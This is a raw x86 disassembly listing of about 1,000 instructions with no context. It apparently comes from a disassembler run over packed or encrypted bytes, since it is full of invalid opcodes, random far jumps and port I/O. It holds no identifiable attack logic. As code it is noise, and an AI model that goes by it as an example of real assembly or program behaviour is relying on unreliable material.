  40287f:	aad    0x65
  402881:	outs   dx,DWORD PTR ds:[esi]
  402882:	dec    BYTE PTR [ebp-0x2575bc15]
  402888:	lea    eax,[edx+ecx*2]
  40288b:	or     ecx,DWORD PTR [eax-0x2d]
  40288e:	pop    ss
  40288f:	inc    edi
  402890:	and    BYTE PTR [edx],ch
  402892:	mov    esp,0xe01aa8b4
  402897:	sbb    BYTE PTR [esi-0x66f628db],bh
  40289d:	or     DWORD PTR [ebx-0xca6afa3],0x65
  4028a4:	(bad)  
  4028a5:	retf   0x692c
  4028a8:	repz adc al,0xc9
  4028ab:	mov    eax,0x243c4f40
  4028b0:	rcr    al,1
  4028b2:	mov    ds:0x5e1cceef,eax
  4028b7:	(bad)  
  4028b8:	fmul   QWORD PTR [esi-0x1c]
  4028bb:	push   edx
  4028bc:	leave  
  4028bd:	icebp  
  4028be:	adc    ah,BYTE PTR [edx]
  4028c0:	xor    DWORD PTR [edi+0x72],0x208b2d2
  4028c7:	jae    0x402894
  4028c9:	idiv   esp
  4028cb:	sub    eax,0xce1f0961
  4028d0:	sub    BYTE PTR [eax*2-0x42a6c81c],0xe7
  4028d8:	pop    eax
  4028d9:	mov    eax,DWORD PTR [edi]
  4028db:	jge    0x4028ae
  4028dd:	dec    ebp
  4028de:	adc    BYTE PTR [ecx+0x71],dh
  4028e1:	lahf   
  4028e2:	sub    dl,BYTE PTR [eax-0x39]
  4028e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028e6:	das    
  4028e7:	xchg   esp,eax
  4028e8:	dec    edi
  4028e9:	cmp    eax,esi
  4028eb:	sub    al,0xd4
  4028ed:	retf   
  4028ee:	fdivp  st(4),st
  4028f0:	xor    al,BYTE PTR [edi+0x52922c93]
  4028f6:	lea    ebp,[ecx+0x16]
  4028f9:	data16 outs dx,BYTE PTR ds:[esi]
  4028fb:	dec    ebx
  4028fc:	and    dh,BYTE PTR [ebx-0x3c]
  4028ff:	fld    QWORD PTR [edi]
  402901:	in     al,0x61
  402903:	fild   WORD PTR [ecx+ecx*1-0x379d0d67]
  40290a:	inc    edi
  40290b:	dec    edi
  40290c:	dec    esi
  40290d:	add    BYTE PTR [ebx+0x3bf7a006],al
  402913:	adc    ah,BYTE PTR [eax]
  402915:	push   ebp
  402916:	fidivr WORD PTR [ecx]
  402918:	fisttp WORD PTR [edi-0xfa55dfa]
  40291e:	call   0xc1efa0ab
  402923:	sub    eax,0x97872f31
  402928:	test   eax,0xa9d05e97
  40292d:	test   eax,0x1115a994
  402932:	xor    BYTE PTR [eax+ecx*2-0x37e6409e],al
  402939:	sbb    BYTE PTR [ecx+0x68],al
  40293c:	daa    
  40293d:	mov    cl,0xbc
  40293f:	mov    dh,0xbf
  402941:	push   ebx
  402942:	jmp    0xb932:0xb034f0bc
  402949:	cwde   
  40294a:	lds    ecx,FWORD PTR [edx+edi*2+0x3d]
  40294e:	ja     0x4029cb
  402950:	sbb    eax,0xde40f638
  402955:	rcl    BYTE PTR [edi+ebx*1],0x4a
  402959:	pusha  
  40295a:	scas   al,BYTE PTR es:[edi]
  40295b:	in     al,0x7c
  40295d:	clc    
  40295e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40295f:	scas   al,BYTE PTR es:[edi]
  402960:	xchg   ah,bh
  402962:	mov    cs,WORD PTR [edx+0x26741427]
  402968:	hlt    
  402969:	into   
  40296a:	in     eax,0xf2
  40296c:	scas   al,BYTE PTR es:[edi]
  40296d:	mov    bl,BYTE PTR [eax-0x4b]
  402970:	(bad)  
  402971:	(bad)  
  402972:	jg     0x40291d
  402974:	mov    bh,0x54
  402976:	in     eax,0x7a
  402978:	cmp    al,0x3a
  40297a:	xlat   BYTE PTR ds:[ebx]
  40297b:	jmp    0x4029d9
  40297d:	popf   
  40297e:	adc    edx,ebx
  402980:	cmp    al,0xff
  402982:	jnp    0x4029f9
  402984:	jns    0x4029b0
  402986:	loop   0x402986
  402988:	cmp    DWORD PTR [esi+0x63],ebp
  40298b:	adc    eax,0xa8317a59
  402990:	cmp    ebx,DWORD PTR [esp+ebx*1-0x63]
  402994:	dec    esi
  402995:	test   BYTE PTR [edx+0x918d4b7],bh
  40299b:	push   es
  40299c:	mov    ebp,0xa98bd677
  4029a1:	cli    
  4029a2:	call   0xedeb:0x5aa9fca3
  4029a9:	xor    esp,ebx
  4029ab:	adc    eax,0x1f6f1b63
  4029b0:	stos   BYTE PTR es:[edi],al
  4029b1:	mov    ebp,0xc8875424
  4029b6:	popa   
  4029b7:	mov    bh,0xe5
  4029b9:	pop    esi
  4029ba:	add    al,0x86
  4029bc:	and    eax,0x98d702b2
  4029c1:	lock repnz adc bh,dh
  4029c5:	iret   
  4029c6:	push   0x4e9919c5
  4029cb:	lods   eax,DWORD PTR ds:[esi]
  4029cc:	pop    ds
  4029cd:	xchg   BYTE PTR [ebx+0x67],ah
  4029d0:	fndisi(8087 only) 
  4029d2:	mov    esi,0x87cc254c
  4029d7:	dec    ebp
  4029d8:	xor    cl,BYTE PTR [ebx-0x2]
  4029db:	xor    eax,0x3a0476ff
  4029e0:	xchg   ebp,edi
  4029e2:	or     al,dl
  4029e4:	lds    edx,FWORD PTR [ecx-0x4e]
  4029e7:	dec    ecx
  4029e8:	daa    
  4029e9:	fmul   QWORD PTR [eax+0x53]
  4029ec:	dec    edx
  4029ed:	mov    bh,0x19
  4029ef:	mov    edx,0x118be706
  4029f4:	pop    es
  4029f5:	push   0xffffff95
  4029f7:	dec    edi
  4029f8:	push   eax
  4029f9:	mov    di,0xc277
  4029fd:	jbe    0x402a76
  4029ff:	push   0xffffffb3
  402a01:	cmp    dl,dh
  402a03:	sbb    al,0x9d
  402a05:	les    ebp,FWORD PTR [ebx-0x2b]
  402a08:	lea    edx,[ebx+0x22dae50d]
  402a0e:	cs (bad) 
  402a10:	fidiv  DWORD PTR [edx-0x74ee2c07]
  402a16:	fdiv   QWORD PTR [eax-0x30]
  402a19:	mov    ebp,0x87b752e6
  402a1e:	ret    
  402a1f:	xchg   DWORD PTR [eax],ebp
  402a21:	cmp    cl,bh
  402a23:	(bad)  
  402a24:	stos   BYTE PTR es:[edi],al
  402a25:	sub    BYTE PTR [esi-0x48],al
  402a28:	add    al,0xb0
  402a2a:	add    edi,ebx
  402a2c:	push   edx
  402a2d:	dec    esi
  402a2e:	lods   al,BYTE PTR ds:[esi]
  402a2f:	dec    esi
  402a30:	cmp    BYTE PTR [edx+0x3b],ch
  402a33:	shl    DWORD PTR [ebp-0x2c],0x52
  402a37:	jbe    0x402a06
  402a39:	mov    ah,0xc4
  402a3b:	xor    ch,BYTE PTR [ecx]
  402a3d:	push   0xe393ed61
  402a42:	and    dl,BYTE PTR [ecx]
  402a44:	pusha  
  402a45:	mov    gs,WORD PTR [esi-0x1f]
  402a48:	xchg   edx,eax
  402a49:	pop    esi
  402a4a:	and    esi,DWORD PTR [ebp-0xe]
  402a4d:	addr16 int 0x8c
  402a50:	enter  0x8afa,0xa2
  402a54:	das    
  402a55:	int3   
  402a56:	scas   eax,DWORD PTR es:[edi]
  402a57:	push   edi
  402a58:	xchg   ecx,eax
  402a59:	jmp    0x5792:0x8ecc362f
  402a60:	iret   
  402a61:	adc    BYTE PTR [ebp+edi*2+0x5d70d47e],al
  402a68:	lea    esi,[ebx-0x18]
  402a6b:	mov    al,ds:0xcd220a5d
  402a70:	dec    eax
  402a71:	mov    DWORD PTR [edx-0x31],edx
  402a74:	imul   ebp,edx,0x23f2103b
  402a7a:	outs   dx,BYTE PTR ds:[esi]
  402a7b:	dec    eax
  402a7c:	sub    DWORD PTR [edi+0x56],eax
  402a7f:	push   cs
  402a80:	(bad)  
  402a81:	xor    al,0x3f
  402a83:	lock fwait
  402a85:	je     0x402a52
  402a87:	(bad)  
  402a88:	cmp    ah,bh
  402a8a:	push   0xfffffff6
  402a8c:	icebp  
  402a8d:	jp     0x402ad5
  402a8f:	je     0x402a6a
  402a91:	test   ecx,eax
  402a93:	dec    edi
  402a94:	sub    eax,0x4d29fc04
  402a99:	mov    bh,bh
  402a9b:	cld    
  402a9c:	jle    0x402acd
  402a9e:	adc    bh,dh
  402aa0:	adc    ebx,DWORD PTR [ebp+0x34b2b941]
  402aa6:	pop    edx
  402aa7:	xchg   BYTE PTR [esi-0x2e8be2a1],ah
  402aad:	rcr    ah,0xb3
  402ab0:	push   ecx
  402ab1:	pop    ebp
  402ab2:	pop    es
  402ab3:	xor    esp,DWORD PTR [edi+0x5afaf209]
  402ab9:	stos   BYTE PTR es:[edi],al
  402aba:	das    
  402abb:	and    DWORD PTR [ebx-0x40],edi
  402abe:	push   es
  402abf:	lea    esp,[esi]
  402ac1:	jecxz  0x402ae9
  402ac3:	push   es
  402ac4:	inc    edx
  402ac5:	mov    bh,BYTE PTR [esi+0xe]
  402ac8:	pop    ebx
  402ac9:	and    DWORD PTR [edx-0x130121e3],0xffffffae
  402ad0:	retf   
  402ad1:	adc    eax,0x2aba0570
  402ad6:	je     0x402abb
  402ad8:	add    DWORD PTR [ecx+0x1e],0x48
  402adc:	aad    0xf7
  402ade:	add    ebp,DWORD PTR [edx+0x78]
  402ae1:	aaa    
  402ae2:	fild   QWORD PTR [ecx]
  402ae4:	stos   DWORD PTR es:[edi],eax
  402ae5:	adc    BYTE PTR [ebp-0x42],bh
  402ae8:	cmc    
  402ae9:	add    al,0x3f
  402aeb:	pop    eax
  402aec:	cmp    esi,ebx
  402aee:	fwait
  402aef:	xchg   edi,eax
  402af0:	in     al,0x9b
  402af2:	push   ecx
  402af3:	push   cs
  402af4:	push   ebp
  402af5:	fwait
  402af6:	xchg   ecx,eax
  402af7:	retf   
  402af8:	pop    ebx
  402af9:	dec    edx
  402afa:	test   al,0xd2
  402afc:	inc    ecx
  402afd:	in     al,dx
  402afe:	and    al,0xbc
  402b00:	daa    
  402b01:	mov    WORD PTR [esi],ss
  402b03:	pop    eax
  402b04:	xor    BYTE PTR [esi-0x55676343],0xd2
  402b0b:	mov    ds:0x423dccf1,al
  402b10:	aam    0xf7
  402b12:	pop    es
  402b13:	lods   eax,DWORD PTR ds:[esi]
  402b14:	bound  edi,QWORD PTR [ecx-0x14]
  402b17:	ror    DWORD PTR [ebp+0x32],0xe6
  402b1b:	and    esp,ebp
  402b1d:	es cwde 
  402b1f:	xchg   BYTE PTR [ebx+0x6790982d],dl
  402b25:	aas    
  402b26:	xor    al,0xb8
  402b28:	jmp    0xe35ea886
  402b2d:	cli    
  402b2e:	out    dx,eax
  402b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b30:	sbb    eax,0x8648a62d
  402b35:	push   0x88b77525
  402b3a:	xor    BYTE PTR cs:[ebp+0x5dcb271e],bh
  402b41:	aaa    
  402b42:	xor    DWORD PTR ds:0xfda4d7a1,ebp
  402b48:	inc    edx
  402b49:	cwde   
  402b4a:	in     al,0xc2
  402b4c:	jae    0x402b4b
  402b4e:	push   ebp
  402b4f:	push   ss
  402b50:	aas    
  402b51:	fist   WORD PTR ss:[esp+ebx*2]
  402b55:	push   ecx
  402b56:	scas   al,BYTE PTR es:[edi]
  402b57:	inc    DWORD PTR [edx-0x60]
  402b5a:	jbe    0x402ae5
  402b5c:	add    al,0xb3
  402b5e:	jno    0x402b65
  402b60:	jbe    0x402afc
  402b62:	inc    edi
  402b63:	xor    bl,BYTE PTR [edi]
  402b65:	fwait
  402b66:	icebp  
  402b67:	rcr    BYTE PTR [esi+0x5cf0dc54],1
  402b6d:	sbb    dh,BYTE PTR [eax+0x36127ad0]
  402b73:	nop
  402b74:	arpl   WORD PTR [ebx-0x27],si
  402b77:	cwde   
  402b78:	pop    ecx
  402b79:	leave  
  402b7a:	lods   eax,DWORD PTR ds:[esi]
  402b7b:	cmp    al,0xdc
  402b7d:	fild   DWORD PTR [esi+0x9]
  402b80:	iret   
  402b81:	mov    al,0xa6
  402b83:	and    BYTE PTR [ebx],ah
  402b85:	mov    ebx,0xeff8dc5e
  402b8a:	int3   
  402b8b:	idiv   BYTE PTR [edx+0x7fe169c3]
  402b91:	adc    esi,DWORD PTR [ebx-0x5f6944b]
  402b97:	mov    edi,0x1564eef1
  402b9c:	outs   dx,BYTE PTR ds:[esi]
  402b9d:	cmp    edx,DWORD PTR [edx]
  402b9f:	pusha  
  402ba0:	sbb    eax,0x97c647f6
  402ba5:	and    dl,BYTE PTR [esi-0x7e583f0]
  402bab:	rol    DWORD PTR [ebx],0x82
  402bae:	scas   al,BYTE PTR es:[edi]
  402baf:	sbb    BYTE PTR [edi],bl
  402bb1:	push   es
  402bb2:	adc    al,0x52
  402bb4:	or     DWORD PTR [edi-0x60],edi
  402bb7:	jmp    0x583ba4a3
  402bbc:	ja     0x402bfe
  402bbe:	jg     0x402b7c
  402bc0:	icebp  
  402bc1:	call   0x403:0x6892acf4
  402bc8:	jmp    0x3192:0xd69d417e
  402bcf:	aaa    
  402bd0:	sub    BYTE PTR ds:0x16216435,bl
  402bd6:	sar    bl,1
  402bd8:	fst    QWORD PTR [ecx+0x42de4f05]
  402bde:	xor    cl,dl
  402be0:	loop   0x402bca
  402be2:	aam    0xe5
  402be4:	push   es
  402be5:	or     DWORD PTR [eax-0x38],ecx
  402be8:	ss es inc edx
  402beb:	adc    BYTE PTR [ecx+edi*2],al
  402bee:	dec    esp
  402bef:	fucomp st(5)
  402bf1:	or     edx,edi
  402bf3:	and    DWORD PTR [eax-0x215754],eax
  402bf9:	movups XMMWORD PTR [eax+0x1e],xmm3
  402bfd:	scas   eax,DWORD PTR es:[edi]
  402bfe:	clc    
  402bff:	sbb    eax,DWORD PTR [edx-0x670a9642]
  402c05:	scas   al,BYTE PTR es:[edi]
  402c06:	out    dx,al
  402c07:	(bad)  
  402c08:	cmp    ebx,DWORD PTR [edx-0x41]
  402c0b:	inc    eax
  402c0c:	dec    ebx
  402c0d:	(bad)  
  402c0e:	sbb    al,0x9c
  402c10:	inc    esi
  402c11:	sbb    bl,al
  402c13:	mov    ds:0xbf674e7d,eax
  402c18:	rcr    eax,cl
  402c1a:	test   al,0x55
  402c1c:	cwde   
  402c1d:	or     BYTE PTR [esi+ecx*1-0x753d55f8],ah
  402c24:	mov    BYTE PTR ds:0xc5b2d8c1,dl
  402c2a:	jns    0x402c69
  402c2c:	fdivr  QWORD PTR [esi-0x6ee7bc60]
  402c32:	iret   
  402c33:	cmp    eax,0xfa8bf1ce
  402c38:	loope  0x402bbe
  402c3a:	aam    0x41
  402c3c:	sbb    esp,ebx
  402c3e:	mov    al,0xb9
  402c40:	jle    0x402c2a
  402c42:	(bad)  
  402c43:	int    0xc9
  402c45:	jp     0x402cc5
  402c47:	adc    DWORD PTR [esi-0x2529a00b],edx
  402c4d:	test   al,0xfd
  402c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c50:	leave  
  402c51:	aad    0xe4
  402c53:	js     0x402c54
  402c55:	adc    BYTE PTR [edx+0x75],dh
  402c58:	ins    DWORD PTR es:[edi],dx
  402c59:	in     eax,dx
  402c5a:	rol    esi,0x2c
  402c5d:	mov    ds:0x1dfc2f30,eax
  402c62:	or     al,0x32
  402c64:	cmp    al,0x91
  402c66:	not    BYTE PTR [edx]
  402c68:	das    
  402c69:	adc    bh,BYTE PTR [ebp+0x4fe76d04]
  402c6f:	mov    ds:0xa54d0c1,eax
  402c74:	jmp    0x8aa7f381
  402c79:	cmp    al,BYTE PTR [edi+0x18]
  402c7c:	jae    0x402c13
  402c7e:	pop    edi
  402c7f:	adc    DWORD PTR [esi+0xb],esi
  402c82:	sahf   
  402c83:	dec    esp
  402c84:	cld    
  402c85:	dec    edx
  402c86:	add    al,0xd3
  402c88:	js     0x402c13
  402c8a:	or     BYTE PTR [ebx+0x19bff70a],dl
  402c90:	mov    eax,ds:0x87b3d33b
  402c95:	enter  0x9286,0xa8
  402c99:	push   ecx
  402c9a:	xor    edi,DWORD PTR [ebx]
  402c9c:	stos   BYTE PTR es:[edi],al
  402c9d:	add    eax,0x97087721
  402ca2:	rcr    BYTE PTR [ebp-0x3e],0x43
  402ca6:	xor    ebp,ebp
  402ca8:	js     0x402c76
  402caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cab:	mov    ds:0xb0645236,al
  402cb0:	jmp    0x402ca2
  402cb2:	cli    
  402cb3:	jl     0x402cea
  402cb5:	ficomp DWORD PTR [edx-0x10bb03a3]
  402cbb:	sahf   
  402cbc:	jl     0x402cfa
  402cbe:	popa   
  402cbf:	jmp    0xe92b:0xe8618095
  402cc6:	hlt    
  402cc7:	pop    eax
  402cc8:	sub    eax,0x38add289
  402ccd:	es xchg esp,ecx
  402cd0:	ret    
  402cd1:	ror    DWORD PTR [ecx],1
  402cd3:	neg    BYTE PTR [esp+esi*8]
  402cd6:	pushf  
  402cd7:	ret    0xdbae
  402cda:	std    
  402cdb:	add    DWORD PTR [esi-0x6d],ebp
  402cde:	cmp    eax,0xf60f5f13
  402ce3:	jo     0x402d5e
  402ce5:	cwde   
  402ce6:	adc    eax,ebp
  402ce8:	jo     0x402d61
  402cea:	xchg   esp,eax
  402ceb:	cmp    DWORD PTR [ebp+esi*2+0x2b],ecx
  402cef:	inc    ebp
  402cf0:	cmp    al,0x18
  402cf2:	hlt    
  402cf3:	es mov bh,0x8b
  402cf6:	stc    
  402cf7:	xlat   BYTE PTR ds:[ebx]
  402cf8:	ror    DWORD PTR [edx],cl
  402cfa:	pop    ss
  402cfb:	fmul   st(0),st
  402cfd:	(bad)  
  402cfe:	push   esi
  402cff:	xor    bh,BYTE PTR [ecx+eax*4]
  402d02:	adc    ebp,DWORD PTR [edi-0x2f]
  402d05:	jecxz  0x402d53
  402d07:	aas    
  402d08:	jno    0x402c8e
  402d0a:	pop    es
  402d0b:	outs   dx,DWORD PTR ds:[esi]
  402d0c:	(bad)  
  402d0d:	jno    0x402cd4
  402d0f:	cmp    BYTE PTR [ebp+ecx*2-0x31],0xd4
  402d14:	jno    0x402d55
  402d16:	adc    DWORD PTR [ecx+0x3f],esi
  402d19:	push   0xffffff82
  402d1b:	mov    ch,0x33
  402d1d:	lock sbb BYTE PTR [edi+0x58],bh
  402d21:	std    
  402d22:	jle    0x402cc3
  402d24:	fs jg  0x402d67
  402d27:	sub    cl,BYTE PTR [ecx]
  402d29:	inc    edi
  402d2a:	sbb    DWORD PTR [edi+0x2e],esp
  402d2d:	or     edi,DWORD PTR [edi]
  402d2f:	icebp  
  402d30:	scas   eax,DWORD PTR es:[edi]
  402d31:	adc    al,0x34
  402d33:	mov    edx,0x76a33b81
  402d38:	repz jl 0x402d16
  402d3b:	out    0x24,eax
  402d3d:	out    dx,al
  402d3e:	rol    DWORD PTR [edi-0x25],0x11
  402d42:	aad    0x9d
  402d44:	fadd   st,st(2)
  402d46:	hlt    
  402d47:	jo     0x402d7f
  402d49:	sti    
  402d4a:	mov    esp,0xc79b2de3
  402d4f:	or     eax,0xfb7169b1
  402d54:	or     esp,DWORD PTR [edx-0x11]
  402d57:	jg     0x402cff
  402d59:	push   ebp
  402d5a:	mov    WORD PTR [esi+0x7e],fs
  402d5d:	shr    BYTE PTR [esi],cl
  402d5f:	aas    
  402d60:	sbb    eax,0xf67e2ca1
  402d65:	aad    0x64
  402d67:	out    0xe3,eax
  402d69:	ja     0x402dcb
  402d6b:	push   edx
  402d6c:	out    dx,eax
  402d6d:	push   ebx
  402d6e:	sub    dh,BYTE PTR [ecx+edx*1-0xb6e82c3]
  402d75:	idiv   BYTE PTR [eax]
  402d77:	cmp    DWORD PTR [esi+0x27ca3e33],eax
  402d7d:	xor    ebp,edi
  402d7f:	mov    ch,0x71
  402d81:	dec    ecx
  402d82:	xor    al,0xa9
  402d84:	rol    BYTE PTR [edi-0x26bbb72b],0x65
  402d8b:	xlat   BYTE PTR ds:[ebx]
  402d8c:	xor    BYTE PTR ds:0x58c14cc6,bl
  402d92:	js     0x402de7
  402d94:	arpl   WORD PTR [ebp+0x5ddfaee3],di
  402d9a:	pushf  
  402d9b:	push   es
  402d9c:	xor    al,0xb
  402d9e:	loop   0x402da4
  402da0:	mov    esp,0xf9807cb3
  402da5:	dec    ebp
  402da6:	leave  
  402da7:	les    ecx,FWORD PTR ds:0xc19004b1
  402dad:	mov    bl,0xa5
  402daf:	xor    al,0xe4
  402db1:	ss aas 
  402db3:	scas   al,BYTE PTR es:[edi]
  402db4:	imul   ebx,DWORD PTR [ecx+esi*8-0x23],0x54375b98
  402dbc:	pop    ds
  402dbd:	adc    BYTE PTR [ecx-0x72],ah
  402dc0:	es adc ch,dl
  402dc3:	sbb    ah,dl
  402dc5:	pusha  
  402dc6:	mov    dl,BYTE PTR [edi+0x5bcdfaee]
  402dcc:	xchg   ebp,eax
  402dcd:	lods   eax,DWORD PTR ds:[esi]
  402dce:	int3   
  402dcf:	pop    ebp
  402dd0:	sbb    cl,BYTE PTR [esi+0x70a8a0e5]
  402dd6:	xchg   ebp,eax
  402dd7:	bound  eax,QWORD PTR [edx+edi*4-0x27c8073d]
  402dde:	cld    
  402ddf:	fidiv  WORD PTR [edx-0xa]
  402de2:	jnp    0x402e3c
  402de4:	enter  0x9ff6,0xf3
  402de8:	jle    0x402e41
  402dea:	fbld   TBYTE PTR [ebx+eax*4-0x4d]
  402dee:	jle    0x402d76
  402df0:	cmp    ebx,DWORD PTR [eax]
  402df2:	push   ss
  402df3:	daa    
  402df4:	or     al,BYTE PTR [ebx-0x37]
  402df7:	clc    
  402df8:	jne    0x402e08
  402dfa:	cmp    edi,edi
  402dfc:	inc    edx
  402dfd:	jae    0x402e6b
  402dff:	sbb    al,BYTE PTR [ebx]
  402e01:	xchg   esp,eax
  402e02:	push   0x38
  402e04:	cmp    al,0xf9
  402e06:	xor    eax,0x58d9ae53
  402e0b:	adc    DWORD PTR [ebp-0x437073e1],eax
  402e11:	cmp    eax,0x9c1d07fe
  402e16:	lea    edx,[ecx-0x7d6454d1]
  402e1c:	call   0x4618:0xbe4ee584
  402e23:	(bad)  
  402e24:	or     ebp,DWORD PTR [ebx]
  402e26:	xor    edi,DWORD PTR [ebx+0x1556a956]
  402e2c:	jb     0x402dd0
  402e2e:	and    BYTE PTR [edi+edx*1+0x7a],dh
  402e32:	adc    al,0x86
  402e34:	or     bh,BYTE PTR [ebp-0x65]
  402e37:	inc    eax
  402e38:	sbb    al,0xae
  402e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e3b:	add    BYTE PTR [edi],al
  402e3d:	push   es
  402e3e:	ins    BYTE PTR es:[edi],dx
  402e3f:	in     al,0xfc
  402e41:	imul   ebp,eax,0x3ce7f637
  402e47:	cdq    
  402e48:	jge    0x402e76
  402e4a:	xor    bl,BYTE PTR [edx]
  402e4c:	fcmove st,st(7)
  402e4e:	push   cs
  402e4f:	xor    al,0x19
  402e51:	sbb    dh,BYTE PTR [ecx-0x7f]
  402e54:	jmp    0x7fbfc332
  402e59:	rol    al,1
  402e5b:	add    BYTE PTR [ebx+0x0],ah
  402e5e:	test   eax,0xc45243da
  402e63:	sbb    DWORD PTR [edi],0xd0f1ad41
  402e69:	dec    edi
  402e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e6b:	inc    edx
  402e6c:	pushf  
  402e6d:	cli    
  402e6e:	mov    cl,BYTE PTR [esi-0xb]
  402e71:	cmp    ecx,DWORD PTR [ebx]
  402e73:	mov    DWORD PTR [esp+ebp*1],esp
  402e76:	mov    cs,WORD PTR [esi-0x39]
  402e79:	arpl   cx,bx
  402e7b:	adc    esp,ecx
  402e7d:	dec    esi
  402e7e:	pushf  
  402e7f:	rcl    bh,1
  402e81:	and    eax,0x4da1abe6
  402e86:	ja     0x402e63
  402e88:	inc    edx
  402e89:	dec    esp
  402e8a:	scas   eax,DWORD PTR es:[edi]
  402e8b:	in     al,0x89
  402e8d:	popa   
  402e8e:	add    esp,DWORD PTR [edi+0x56a19369]
  402e94:	int    0x7d
  402e96:	push   edi
  402e97:	(bad)  
  402e9a:	cld    
  402e9b:	(bad)  
  402e9c:	sub    al,0x22
  402e9e:	mov    ebx,0x3c22cca0
  402ea3:	loopne 0x402e54
  402ea5:	xchg   ecx,eax
  402ea6:	inc    ebp
  402ea7:	cmp    eax,0x70886f00
  402eac:	dec    ebp
  402ead:	sbb    al,0xeb
  402eaf:	fisttp DWORD PTR [ebx+esi*8+0x20]
  402eb3:	and    BYTE PTR [ebp+0x67c7bba4],cl
  402eb9:	repnz mov ebx,0xcbde7fe4
  402ebf:	add    BYTE PTR [ebx-0x134ec5ea],0x19
  402ec6:	push   ecx
  402ec7:	sbb    al,0xe8
  402ec9:	jecxz  0x402ecf
  402ecb:	aam    0xe
  402ecd:	mov    ds:0x6c6c4018,eax
  402ed2:	mov    eax,0x85aba3a7
  402ed7:	pop    edi
  402ed8:	inc    esp
  402ed9:	xor    al,0x21
  402edb:	sub    eax,0xdc564253
  402ee0:	test   eax,0x20041f75
  402ee5:	mov    DWORD PTR ss:[ecx+0x4a],ebp
  402ee9:	je     0x402f27
  402eeb:	leave  
  402eec:	and    BYTE PTR [edx+0x3f1bd2a5],cl
  402ef2:	mov    ds:0x31086b9d,eax
  402ef7:	(bad)  
  402ef9:	jl     0x402f2f
  402efb:	mov    edx,0x3c18c952
  402f00:	lock sbb edx,DWORD PTR [ecx]
  402f03:	cwde   
  402f04:	inc    esp
  402f05:	nop
  402f06:	pushf  
  402f07:	push   esi
  402f08:	loope  0x402ecb
  402f0a:	std    
  402f0b:	and    BYTE PTR [edi],bl
  402f0d:	out    dx,eax
  402f0e:	or     dl,BYTE PTR [eax-0x7a07dc11]
  402f14:	mov    esi,0x2cbefc7c
  402f19:	mov    edi,0x1b2785a
  402f1e:	and    eax,0x74baf0a7
  402f23:	push   esi
  402f24:	jecxz  0x402f9f
  402f26:	xchg   edx,eax
  402f27:	cli    
  402f28:	lock das 
  402f2a:	pop    edx
  402f2b:	dec    DWORD PTR [ebp-0x41]
  402f2e:	dec    esi
  402f2f:	fimul  DWORD PTR [ecx+edi*8+0x51e54d52]
  402f36:	out    dx,al
  402f37:	adc    edx,edi
  402f39:	pop    esp
  402f3a:	jno    0x402f32
  402f3c:	xor    eax,0x9cbdb496
  402f41:	xchg   BYTE PTR [esp+eiz*8+0x3d77c6f3],ch
  402f48:	mov    esp,0xeae89c54
  402f4d:	ins    BYTE PTR es:[edi],dx
  402f4e:	xchg   ecx,eax
  402f4f:	mov    al,ds:0x291e548f
  402f54:	push   es
  402f55:	(bad)  
  402f56:	mov    edx,0xd684b48a
  402f5b:	push   ebp
  402f5c:	adc    ebp,esi
  402f5e:	jecxz  0x402f6f
  402f60:	fist   DWORD PTR [ecx+edx*8+0x7facdcf0]
  402f67:	lock inc ebp
  402f69:	shr    DWORD PTR [edi-0x5fa016b5],1
  402f6f:	sbb    BYTE PTR ds:0x1af82001,cl
  402f75:	push   esi
  402f76:	mov    ds:0x5ac2df5f,al
  402f7b:	loope  0x402fe3
  402f7d:	jge    0x402f11
  402f7f:	fadd   DWORD PTR [edx+0x264127aa]
  402f85:	mov    ebp,DWORD PTR [edi+0x52]
  402f88:	mov    ch,0x0
  402f8a:	sbb    eax,0x29190cf5
  402f8f:	je     0x403003
  402f91:	mov    al,0x2f
  402f93:	in     al,0x2b
  402f95:	sahf   
  402f96:	shr    BYTE PTR [ebx+0x42],1
  402f99:	cli    
  402f9a:	jae    0x402f90
  402f9c:	retf   0x4524
  402f9f:	inc    eax
  402fa0:	mov    edi,0xbf0f1973
  402fa5:	cmp    eax,0x7bc33030
  402faa:	pusha  
  402fab:	out    dx,eax
  402fac:	xor    DWORD PTR [edx+0x29e70ac0],0xa13a7cdb
  402fb6:	and    al,0x71
  402fb8:	add    BYTE PTR [ebx+0x21],cl
  402fbb:	xor    DWORD PTR [eiz*4+0x760a2b73],ebp
  402fc2:	cli    
  402fc3:	mov    edi,0x205817fb
  402fc8:	imul   eax,DWORD PTR ds:0xe16b3082,0x1e88bc88
  402fd2:	out    0x65,eax
  402fd4:	retf   
  402fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd6:	(bad)  
  402fd8:	pop    ecx
  402fd9:	jne    0x402fb3
  402fdb:	mov    al,ds:0x2045ee75
  402fe0:	dec    ecx
  402fe1:	fimul  WORD PTR [ecx]
  402fe3:	pop    ebx
  402fe4:	xor    esp,esi
  402fe6:	bswap  ecx
  402fe8:	pop    esi
  402fe9:	mov    ebp,0xa8b0c7c1
  402fee:	dec    edi
  402fef:	(bad)  
  402ff0:	fld    TBYTE PTR [ebx-0x3f966c1]
  402ff6:	shr    esp,1
  402ff8:	mov    al,ds:0x713a66f2
  402ffd:	cmp    eax,0x8ed63759
  403002:	xchg   esi,eax
  403003:	jmp    0x5b836162
  403008:	or     eax,0x235cd43c
  40300d:	mov    ebx,0x471f1fd6
  403012:	fidivr DWORD PTR [ebx]
  403014:	ds je  0x402fb0
  403017:	int3   
  403018:	sub    ebx,ebp
  40301a:	mov    ds:0xaedaf6b2,al
  40301f:	cwde   
  403020:	xchg   edx,eax
  403021:	out    0x4a,eax
  403023:	outs   dx,BYTE PTR ds:[esi]
  403024:	shl    DWORD PTR cs:[esi],1
  403027:	mov    DWORD PTR [esi-0x27],0x57b2447
  40302e:	sbb    ebx,DWORD PTR [ebx-0x7a90a949]
  403034:	scas   al,BYTE PTR es:[edi]
  403035:	and    al,0xc0
  403037:	xchg   ebp,eax
  403038:	xchg   esi,eax
  403039:	gs mov ebp,0x98f667c
  40303f:	mov    BYTE PTR [ecx],dh
  403041:	loopne 0x403030
  403043:	adc    eax,0x5fa9f574
  403048:	imul   esi,DWORD PTR [ecx-0x3fa8d203],0xc762a5b
  403052:	(bad)  
  403053:	xchg   esp,eax
